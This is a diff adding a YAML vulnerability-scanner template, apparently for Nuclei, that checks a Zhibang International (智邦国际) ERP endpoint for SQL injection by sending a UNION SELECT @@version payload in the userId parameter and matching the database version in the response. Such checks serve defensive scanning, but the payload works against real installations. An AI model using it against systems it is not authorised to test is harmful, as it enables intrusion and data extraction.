@@ -1,0 +1,30 @@
+id: zhibangguoji-ERP-sql
+
+info:
+  name: 智邦国际 ERP SQL注入漏洞
+  author: unknown
+  severity: high
+  description: 智邦国际 ERP存在QL注入漏洞
+  tags: sql injection
+  
+http:
+  - raw:    
+      - |
+        GET /SYSN/json/pcclient/GetPersonalSealData.ashx?imageDate=1&userId=-1%20union%20select%20@@version-- HTTP/1.1
+        Host: {{Hostname}}
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"SealData":"Microsoft'
+      - type: status
+        status: 
+          - 200
+
+
+
+
+
